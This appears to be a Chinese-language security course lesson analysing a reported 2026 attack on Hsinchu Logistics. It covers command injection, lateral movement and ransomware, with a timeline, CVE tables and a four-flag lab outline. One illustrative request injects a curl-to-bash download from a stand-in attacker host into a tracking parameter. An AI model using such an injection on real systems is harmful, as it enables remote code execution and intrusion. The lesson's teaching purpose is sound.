# Week 10 — 真實資安事件分析：新竹物流被駭事件

**日期**：2026/05/04–05/10  
**時長**：1 小時  
**延續**：W08 AI 漏洞研究 → W09 Prompt Injection → 本週以真實事件為骨架，實作完整攻擊鏈

---

## 一、事件概述

2026 年 4 月 17 日，台灣知名物流業者**新竹物流**遭受網路攻擊，官網與核心系統全面癱瘓，持續超過 2 天。用戶無法寄件、取件或查詢物流狀態，大量包裹滯留，引發社會輿論。4 月 20 日，新竹物流向**台北市刑事警察大隊**報案，案件進入偵查程序。

---

## 二、攻擊手法分析

### 初始入侵：指令注入（[CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808)）

攻擊者透過物流查詢系統的 HTTP 請求參數，注入未經驗證的作業系統指令。  
此漏洞屬於 **OS Command Injection**，CVSS 分數 9.8（Critical），無需帳號即可觸發，允許攻擊者在伺服器上執行任意指令。

```
# 攻擊示意
GET /track?id=1234;curl http://attacker.com/shell.sh|bash
```

### 橫向移動：雲端主機淪陷

取得初始 RCE 後，攻擊者橫向擴散至雲端主機，導致主要系統全數無法存取。  
此階段企業通常需要緊急切斷所有內外網連線，造成服務全面中斷。

### 持久化：勒索軟體部署（[CVE-2026-33825](https://nvd.nist.gov/vuln/detail/CVE-2026-33825)）

攻擊者最終部署 **Payouts King** 勒索軟體，以偽裝於虛擬機中運行的方式規避偵測，對企業資料進行加密，同時威脅若未支付贖金即公開資料。

---

## 三、攻擊時間軸

```
04/17  攻擊者透過 CVE-2026-39808 取得初始 RCE
       └─ 橫向移動至雲端主機
       └─ 部署 Payouts King 勒索軟體（CVE-2026-33825）

04/17  官網與系統全面癱瘓，用戶無法查詢或寄件
04/18  系統仍未恢復，輿論持續發酵
04/19  初步系統恢復
04/20  新竹物流向台北市刑事警察大隊報案
```

---

## 四、影響範圍

| 面向 | 衝擊 |
|------|------|
| 服務中斷 | 官網、App、物流查詢全數停擺超過 2 天 |
| 業務損失 | 大量包裹滯留，客戶信任受損 |
| 法律程序 | 向刑事警察大隊報案，案件進入偵查 |
| 供應鏈影響 | 下游電商、網購平台出貨延誤 |

---

## 五、對應 CVE 彙整

| CVE | 類型 | CVSS | 說明 |
|-----|------|------|------|
| [CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808) | OS Command Injection | 9.8 | HTTP 請求參數未過濾，直接拼接進 shell |
| [CVE-2026-33825](https://nvd.nist.gov/vuln/detail/CVE-2026-33825) | 勒索軟體 / VM 逃逸 | 8.1 | 惡意程式偽裝於 VM 中執行，規避端點偵測 |

---

## 六、本週實作

本週以 CVE-2026-39808 為起點，延伸設計 4 個漏洞關卡，模擬從初始入侵到內網橫向的攻擊鏈：

| 關卡 | CVE | 攻擊類型 |
|------|-----|----------|
| Flag 1 | [CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808) | Command Injection |
| Flag 2 | [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) | Path Traversal |
| Flag 3 | [CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963) | SSTI |
| Flag 4 | [CVE-2021-26855](https://nvd.nist.gov/vuln/detail/CVE-2021-26855) | SSRF |

詳細實作流程請見 [`Lab-Pen-Test.md`](Lab-Pen-Test.md)。  
報告繳交範本請見 [`pentest-report-template.md`](pentest-report-template.md)。

---

## 七、延伸閱讀

### 新竹物流事件新聞報導

- [新竹物流遭駭大停擺，物流關鍵基礎設施成資安破口（TechNews 科技新報）](https://infosecu.technews.tw/2026/04/20/hct-hacker/)
- [新竹物流驚傳遭駭！癱瘓 2 天還沒好（Newtalk 新聞）](https://newtalk.tw/news/view/2026-04-18/1030469)
- [「新竹物流」遭網路攻擊，北市刑大證實接獲報案（Newtalk 新聞）](https://newtalk.tw/news/view/2026-04-20/1030757)
- [新竹物流傳遭駭客攻擊，今赴北市刑大報案（聯合新聞網）](https://udn.com/news/story/7320/9452432)
- [新竹物流遭網攻報案，北市刑大偵辦中（大紀元）](https://www.epochtimes.com/b5/26/4/20/n14745751.htm)
- [物流中斷的資安壓力測試：零日攻擊下的營運韌性（CIO Taiwan）](https://www.cio.com.tw/110866/)

### 資安週報與背景資料

- [iThome 資安週報 0420–0424：漏洞五年暴增 263%，NIST 轉向風險優先策略](https://www.ithome.com.tw/news/175284)
- [NIST NVD](https://nvd.nist.gov/)
